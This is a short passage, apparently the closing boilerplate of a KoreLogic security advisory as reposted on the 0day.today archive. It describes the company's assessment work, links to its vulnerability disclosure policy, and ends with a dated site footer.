+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
+
+#  0day.today [2024-09-19]  #
